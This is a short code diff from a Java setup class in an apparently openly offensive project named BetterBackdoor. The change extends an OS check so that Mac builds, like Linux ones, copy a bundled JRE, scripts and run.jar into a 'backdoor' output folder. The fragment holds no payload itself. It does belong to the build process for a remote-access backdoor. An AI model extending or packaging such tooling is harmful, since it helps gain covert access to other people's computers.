@@ -23,7 +23,8 @@ public class Setup {
 					new File("backdoor" + File.separator + "jre" + File.separator + "bin"));
 			FileUtils.copyDirectory(new File(jrePath + File.separator + "lib"),
 					new File("backdoor" + File.separator + "jre" + File.separator + "lib"));
-		} else if (BetterBackdoor.os.contains("Linux") && new File("jre").isDirectory())
+		} else if ((BetterBackdoor.os.contains("Linux") || BetterBackdoor.os.contains("Mac"))
+				&& new File("jre").isDirectory())
 			FileUtils.copyDirectory(new File("jre"), new File("backdoor" + File.separator + "jre"));
 		FileUtils.copyDirectory(new File("scripts"), new File("backdoor" + File.separator + "scripts"));
 		FileUtils.copyFile(new File("target" + File.separator + "run.jar"),
